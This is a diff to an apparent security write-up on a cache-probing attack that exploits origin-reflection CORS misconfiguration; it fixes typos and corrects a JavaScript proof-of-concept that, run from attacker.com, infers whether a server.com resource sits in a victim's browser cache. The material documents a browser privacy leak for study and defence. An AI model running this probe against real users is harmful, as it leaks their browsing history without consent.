@@ -64,22 +64,23 @@ If a resource hosted on `server.com` is requested from `target.com` then the ori
 - The resource is not in cache: the resource could be fetched and stored together with the `Access-Control-Allow-Origin: attacker.com` header.
 - The resource was already in cache: fetch attempt will try to fetch the resource from the cache but it will also generate a CORS error due to the ACAO header value mismatch with the requesting origin (`target.com` origin was expected but `attacker.com` was provided). Here below is provided an example code snippet epxloting this vulnerability to infer the cache status of the victim's browser. 
 ```javascript
-// The function simply take a url and fetch it in CORS mode
-// if the fetch raises an error, it will be a CORS error due to the 
-// origin mismatch between attacker.com and victim's ip
-function checkCachedResource(url) {
-    fetch(url, {
+// The function simply takes a url and fetches it in CORS mode.
+// If the fetch raises an error, it will be a CORS error due to the 
+// origin mismatch between attacker.com and victim's IP.
+function ifCached(url) {
+    // returns a promise that resolves to true on fetch error 
+    // and to false on success
+    return fetch(url, {
         mode: "cors"
-        }).catch((e) => {
-            return true
-        });
-    return false
+    })
+    .then(() => false)
+    .catch(() => true);
 }
 
-// This makes sense only if the attacker alredy knows that
-// server.com suffers from origin reflection CORS misconfiguration
+// This makes sense only if the attacker already knows that
+// server.com suffers from origin reflection CORS misconfiguration.
 var resource_url = "server.com/reflected_origin_resource.html"
-verdict = checkCachedResource(resource_url)
+var verdict = await ifCached(resource_url)
 console.log("Resource was cached: " + verdict)
 ```
 
